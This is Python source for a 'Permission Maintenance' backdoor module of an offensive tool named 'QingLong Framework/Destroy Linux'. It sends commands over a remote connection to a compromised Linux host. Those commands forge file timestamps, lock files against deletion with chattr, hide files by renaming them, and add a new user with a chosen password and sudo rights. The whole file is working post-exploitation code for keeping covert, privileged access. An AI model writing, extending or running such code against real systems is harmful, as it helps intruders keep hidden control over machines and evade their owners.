import os
import sys
import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import InMemoryHistory

sys.path.append(os.path.dirname(os.path.realpath(__file__)))
from AuxiliaryFunctions import MyTable


class PermissionMaintenance:
    def __init__(self, conn):
        commands = ["back", "show params", "show functions"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Destroy Linux)-\033[0m\033[1;31;31m[BackDoor/Permission Maintenance] \033[0m')
        history = InMemoryHistory()
        while True:
            try:
                choice = prompt(formatted_text1, completer=completer, history=history)
                if choice.lower() == 'show functions':
                    self.show_functions()
                    continue
                elif choice == 'show params':
                    self.show_params()
                    continue
                elif choice == "":
                    continue
                elif choice == 'back':
                    break
                elif choice.split()[0] == '1':
                    command = "touch -r {} {}".format(choice.split()[1], choice.split()[2])
                    self.receive(conn, command)
                    continue
                elif choice.split()[0] == '2':
                    command = "chattr +i {}".format(choice.split()[1])
                    self.receive(conn, command)
                    continue
                elif choice.split()[0] == '3':
                    command = "mv {} .{}".format(choice.split()[1], choice.split()[1])
                    self.receive(conn, command)
                    continue
                elif choice.split()[0] == '4':
                    print('\033[1;32;32m' + "[+] 创建用户{}:".format(choice.split()[1]) + '\033[0m')
                    command = "useradd -m {}".format(choice.split()[1])
                    self.receive(conn, command)
                    print('\033[1;32;32m' + "[+] 设置用户{}的密码:".format(choice.split()[1]) + '\033[0m')
                    command = "echo '{}:{}' | sudo chpasswd".format(choice.split()[1], choice.split()[2])
                    self.receive(conn, command)
                    print('\033[1;32;32m' + "[+] 赋予用户{} sudo权限:".format(choice.split()[1]) + '\033[0m')
                    command = "usermod -aG sudo {}".format(choice.split()[1])
                    self.receive(conn, command)
                    continue
            except:
                print('\033[1;31;31m' + "[-] something wrong!" + '\033[0m')
                continue

    def receive(self, conn, command):
        conn.sendall(command.encode("utf-8"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("utf-8", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("utf-8", errors="ignore")
                print(result)
                break

    def show_functions(self):
        print("\n" + '\033[1;34;34m' + "Permission Maintenance" + '\033[0m' + "\n" + '=' * len("Permission Maintenance") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["1", "Forgery Time", "1 reference target", "伪造目标文件的创建时间"],
                  ["2", "Lock File", "2 Lock_File", "锁定目标文件，使其无法被删除"],
                  ["3", "Hide target file", "3 hide_file", "隐藏目标文件"],
                  ["4", "Create a user with sudo permissions", "4 username password", "创建具有sudo权限的用户"]]
        MyTable.createTable(headers, mydata)

    def show_params(self):
        print("\n" + '\033[1;34;34m' + "Parameter Description" + '\033[0m' + "\n" + '=' * len("Parameter Description") + "\n")
        headers = ['\033[1;34;34m' "Params" + '\033[0m', '\033[1;34;34m' "Description" + '\033[0m']
        mydata = [["reference", "目标时间戳的文件，要求输入绝对路径，如/root/Desktop/1.txt"],
                  ["target", "要修改时间戳的目标文件，要求输入绝对路径，如/root/Desktop/2.txt"],
                  ["Lock_File", "需要锁定的目标文件，要求输入绝对路径，如/root/Desktop/3.txt"],
                  ["hide_file", "需要隐藏的目标文件，要求输入绝对路径，如/root/Desktop/4.txt"],
                  ["username", "用户名"],
                  ["password", "用户密码"]]
        MyTable.createTable(headers, mydata)
